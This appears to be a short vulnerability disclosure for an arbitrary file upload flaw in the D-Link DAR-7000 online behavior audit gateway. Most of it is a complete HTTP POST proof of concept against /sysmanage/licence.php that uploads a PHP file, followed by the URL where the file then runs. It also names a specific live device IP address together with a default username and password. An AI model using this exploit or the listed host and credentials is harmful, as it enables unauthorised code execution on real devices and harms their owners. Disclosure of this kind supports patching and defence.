The D-LINK DAR-7000 series online behavior audit gateway has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

Vulnerability Path ：/sysmanage/licence.php

Ip：https://60.22.74.195:8443/

Default account password: test/ admin@123

poc:
```
POST /sysmanage/licence.php? HTTP/1.1
Host: 
Cookie: PHPSESSID=26a1775947167e57a44ae5a532938679
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 714
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="ck"

radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_tftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_ftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—

```
<img width="728" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/9cd9947c-a851-45b5-b4de-9a5442912f2f">

https://60.22.74.195:8443/home/upload/phpinfo.php

<img width="712" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/0fd3a389-dd5e-4524-bf37-b261c990a6fc">

